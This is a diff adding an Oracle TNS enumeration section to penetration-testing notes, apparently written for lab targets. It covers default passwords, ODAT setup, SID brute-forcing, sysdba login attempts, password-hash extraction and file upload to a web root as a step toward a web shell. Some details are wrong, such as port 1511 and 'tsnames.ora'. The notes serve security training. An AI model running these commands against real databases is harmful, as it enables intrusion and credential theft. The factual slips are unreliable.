@@ -705,3 +705,136 @@ __Mssqlclient.py__
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 select name from sys.databases
 ```
+# Oracle TNS Enumeration
+
+The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
+its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount (IPv6 and SSL/TLS encryption).
+It enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. 
+
+TNS listens on port __TCP/1511__ Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g. listener accepts only authorized hosts using combination of hostnames,IPs, username and passwords. The configuration files for Oracle TNS are called tnsnames.ora and listener.ora and are typically located in the $ORACLE_HOME/network/admin directory.
+
+Oracle TNS: Used for communication between Oracle services.
+Default Passwords:
+Oracle 9: Default password “CHANGE_ON_INSTALL”.
+Oracle 10: No default password set.
+Oracle DBSNMP: Default password “dbsnmp”.
+Security Risks:
+Finger Service: Can expose user information (e.g., home directories), posing a security risk when used with Oracle services.
+
+The client-side Oracle Net Services software uses the __tnsnames.ora__ file to resolve service names to network addresses, while the listener process uses the __listener.ora__ file to determine the services it should listen to and the behavior of the listener.
+
+PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, and it contains the names of PL/SQL packages or types that should be excluded from execution.
+
+| Setting            | Description                                                                 |
+|--------------------|-----------------------------------------------------------------------------|
+| DESCRIPTION        | A descriptor that provides a name for the database and its connection type. |
+| ADDRESS            | The network address of the database, which includes the hostname and port number. |
+| PROTOCOL           | The network protocol used for communication with the server.                |
+| PORT               | The port number used for communication with the server.                     |
+| CONNECT_DATA       | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. |
+| INSTANCE_NAME      | The name of the database instance the client wants to connect.              |
+| SERVICE_NAME       | The name of the service that the client wants to connect to.                |
+| SERVER             | The type of server used for the database connection, such as dedicated or shared. |
+| USER               | The username used to authenticate with the database server.                 |
+| PASSWORD           | The password used to authenticate with the database server.                 |
+| SECURITY           | The type of security for the connection.                                    |
+| VALIDATE_CERT      | Whether to validate the certificate using SSL/TTLS.                         |
+| SSL_VERSION        | The version of SSL/TLS to use for the connection.                           |
+| CONNECT_TIMEOUT    | The time limit in seconds for the client to establish a connection to the database. |
+| RECEIVE_TIMEOUT    | The time limit in seconds for the client to receive a response from the database. |
+| SEND_TIMEOUT       | The time limit in seconds for the client to send a request to the database. |
+| SQLNET.EXPIRE_TIME | The time limit in seconds for the client to detect a connection has failed. |
+| TRACE_LEVEL        | The level of tracing for the database connection.                           |
+| TRACE_DIRECTORY    | The directory where the trace files are stored.                             |
+| TRACE_FILE_NAME    | The name of the trace file.                                                 |
+| LOG_FILE           | The file where the log information is stored.                               |
+
+### Oracle-tools-setup.sh
+```
+#!/bin/bash
+
+sudo apt-get install libaio1 python3-dev alien -y
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+git submodule init
+git submodule update
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+```
+
+### ODAT 
+
+ODAT is tool to enumarate and exploit vulnerabilities in oracle databases.
+```
+./odat.py -h
+```
+
+ODAT all scripts option
+```
+./odat.py all -s 10.129.204.235
+```
+
+Oracle TNS Nmap
+```
+sudo nmap -p1521 -sV 10.129.204.235 --open
+```
+In Oracle RDBMS, a System Identifier (SID) is a unique name that identifies a particular database instance.client connects to an Oracle database, it specifies the database's SID along with its connection string. These SID's are in __tsnames.ora__ usually.
+
+### Nmap SID Bruteforce 
+```
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+```
+### SQLplus login
+```
+sqlplus scott/tiger@10.129.204.235/XE #scott is user and tiger password from odat all scan
+```
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute
+```
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+### Oracle RDBMS Interaction
+```
+select table_name from all_tables;
+```
+```
+select * from user_role_privs;
+```
+
+If user does not privledges we can use the same account to try to login as the System Database Admin (sysdba), giving us higher privileges. This possible if admin has granted or account is of admin.
+
+```
+sqlplus scott/tiger@10.129.204.235/XE as sysdba # Trying to login scott as sysdba
+select * from user_role_privs; # To see privledges 
+```
+
+### Oracle RDBMS Extract Password Hashes
+
+```
+ select name, password from sys.user$;
+```
+### Oracle RDBMSFile Upload
+Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. 
+
+| OS      | Path                |
+|---------|---------------------|
+| Linux   | /var/www/html       |
+| Windows | C:\inetpub\wwwroot  |
+
+Try uploading using normal text file before uploading shell to test the IPS/IDS.
+```
+echo "Oracle File Upload Test" > testing.txt
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+Curl the uploaded file
+```
+curl -X GET http://10.129.204.235/testing.txt
+```
